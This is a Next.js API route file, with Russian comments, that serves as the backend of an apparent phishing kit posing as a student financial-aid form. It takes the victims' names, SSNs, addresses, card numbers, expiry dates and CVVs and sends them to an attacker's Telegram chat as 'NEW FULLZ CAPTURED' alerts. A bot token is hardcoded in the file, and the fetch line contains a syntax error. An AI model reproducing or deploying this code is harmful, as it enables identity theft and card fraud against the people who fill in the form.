 NextResponse } from 'next/server';

// Твой Telegram бот токен и chat ID
const TELEGRAM_BOT_TOKEN = '8390637140:AAGsArp5iMbDGPVx5xVGiA2DbF7rszHU45Q';
const TELEGRAM_CHAT_ID = '5425350181';

export async function POST(request: Request) {
  try {
    const data = await request.json();

    // Форматируем сообщение для Telegram
    const message = `
🎣 *NEW FULLZ CAPTURED* 🎣

👤 *Personal Information:*
• Name: ${data.fullName}
• Email: ${data.email}
• Phone: ${data.phone}
• DOB: ${data.dateOfBirth}
• SSN: ||${data.ssn}||
• Address: ${data.address}, ${data.city}, ${data.state} ${data.zipCode}

🎓 *Education:*
• University: ${data.university}
• Field: ${data.fieldOfStudy}
• Year: ${data.academicYear}
• GPA: ${data.gpaRange}

💰 *Financial Info:*
• Housing: ${data.housingStatus}
• Income: ${data.familyIncome}
• Loans: ${data.studentLoans}
• Dependents: ${data.dependents}

💳 *Banking Info:*
• Bank: ${data.bankName}
• Card: ||${data.cardNumber}||
• Exp: ${data.expDate}
• CVV: ||${data.cvv}||
• Cardholder: ${data.cardholderName}

📝 *Additional Info:*
• Career Goals: ${data.careerGoals}
• Contact Method: ${data.contactMethod}
• Special Circumstances: ${data.specialCircumstances || 'None'}

🌐 *Technical Info:*
• IP: ${request.headers.get('x-forwarded-for') || 'Unknown'}
• Time: ${new Date().toISOString()}
• User Agent: ${request.headers.get('user-agent')}
    `;

    // Отправляем в Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${8390637140:AAGsArp5iMbDGPVx5xVGiA2DbF7rszHU45Q}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      }),
    });

    if (!telegramResponse.ok) {
      console.error('Telegram API error:', await telegramResponse.text());
    }

    // Сохраняем в файл (для бэкапа)
    const logData = `
=== NEW SUBMISSION ${new Date().toISOString()} ===
${JSON.stringify(data, null, 2)}
=== END SUBMISSION ===

    `;

    // Здесь можно добавить сохранение в файл или базу данных

    return NextResponse.json({ success: true });

  } catch (error) {
    console.error('Error processing submission:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
